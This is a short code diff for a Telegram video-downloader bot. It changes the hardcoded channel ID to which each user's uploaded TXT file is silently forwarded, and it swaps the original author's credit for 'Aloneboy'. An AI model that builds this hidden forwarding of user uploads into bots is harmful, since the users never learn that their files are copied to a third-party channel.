@@ -46,7 +46,7 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('Send me **TXT File**⚡️')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1002038669257, x)
+    await bot.send_document(-1004252687833, x)
     await input.delete(True)
 
     path = f"./downloads/{m.chat.id}"
@@ -190,7 +190,7 @@ async def account_login(bot: Client, m: Message):
                         time.sleep(e.x)
                         continue
                 else:
-                    Show = f"**⏬️ 🄳🄾🅆🄽🄻🄾🄰🄳🄸🄽🄶 ⏬️... »**\n\n**🧾Name »** `{name}\n♻️Quality » {raw_text2}`\n\n**🔗URL »** `{url}`\n\n **🚩Bot made by SURYA BISHNOI ❤️**"
+                    Show = f"**⏬️ 🄳🄾🅆🄽🄻🄾🄰🄳🄸🄽🄶 ⏬️... »**\n\n**🧾Name »** `{name}\n♻️Quality » {raw_text2}`\n\n**🔗URL »** `{url}`\n\n **🚩Bot made by Aloneboy ❤️**"
                     prog = await m.reply_text(Show)
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
@@ -207,7 +207,7 @@ async def account_login(bot: Client, m: Message):
 
     except Exception as e:
         await m.reply_text(e)
-    await m.reply_text("**DONE BRO 😎**")
+    await m.reply_text("**DONE Aloneboy BRO 😎**")
 
 
 bot.run()
